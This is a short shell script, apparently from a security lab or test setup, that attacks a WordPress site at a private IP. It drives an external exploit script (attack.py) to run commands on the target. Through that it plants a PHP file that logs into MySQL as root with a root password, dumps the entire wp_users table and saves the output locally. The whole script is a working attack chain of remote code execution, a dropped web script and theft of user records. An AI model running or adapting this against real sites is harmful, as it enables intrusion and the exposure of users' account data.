#!/bin/sh

DB_OUT_FILE="/usr/share/capture/db_dump.txt"
PHP_CODE="<?php \$host = \"mysql_server\";\$user = \"root\";\$password = \"root\";\$db = \"wordpress\";\$conn = mysqli_connect(\$host, \$user, \$password, \$db);\$res = \$conn->query(\"SELECT * FROM \`wp_users\`;\");while (\$row = \$res->fetch_assoc()) {var_dump(\$row);} ?>"

touch "${DB_OUT_FILE}"

echo "echo '${PHP_CODE}' >> exec.php" | python3 /usr/share/scripts/attack.py --u http://172.18.0.2 -p /?p=1 > /dev/null
echo "php exec.php" | python3 /usr/share/scripts/attack.py --u http://172.18.0.2 -p /?p=1 > $DB_OUT_FILE